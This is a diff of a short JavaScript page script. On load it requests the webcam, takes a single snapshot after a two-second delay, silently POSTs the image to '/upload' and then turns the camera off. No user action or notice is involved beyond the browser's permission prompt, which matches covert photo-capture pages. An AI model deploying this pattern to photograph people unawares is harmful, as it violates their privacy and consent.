@@ -1,36 +1,30 @@
 window.onload = function () {
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
 
     navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function (stream) {
+        .then(stream => {
             video.srcObject = stream;
-            video.onloadedmetadata = () => {
-                setTimeout(() => {
-                    captureAndSend();
-                }, 3000); // 3s delay before capture
-            };
+
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const imageData = canvas.toDataURL('image/jpeg');
+
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData })
+                });
+
+                
+                stream.getTracks().forEach(track => track.stop());
+            }, 2000); 
         })
         .catch(err => {
-            console.error("Permission denied or no camera", err);
+            console.error('Camera access denied or not available.', err);
         });
-
-    function captureAndSend() {
-        const context = canvas.getContext('2d');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0);
-
-        const dataURL = canvas.toDataURL('image/jpeg');
-        fetch('/upload', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: 'image=' + encodeURIComponent(dataURL)
-        })
-        .then(res => res.text())
-        .then(data => console.log(data))
-        .catch(err => console.error(err));
-    }
 };
